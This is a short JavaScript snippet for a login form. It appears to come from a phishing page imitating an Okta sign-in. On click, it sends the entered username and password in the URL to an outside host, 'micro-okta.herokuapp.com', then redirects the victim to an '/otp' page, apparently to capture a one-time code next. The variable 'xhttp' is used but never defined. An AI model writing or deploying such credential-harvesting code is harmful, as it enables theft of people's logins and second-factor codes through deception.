const sbutn = document.getElementById('s1');
sbutn.addEventListener("click",asubmit)

function asubmit() {
  const url='https://micro-okta.herokuapp.com/login?id='+document.getElementById("id").value+'&pass='+document.getElementById("pass").value;   
  xhttp.open("GET", url , true);
  xhttp.send();
  window.location.replace("/otp");
}
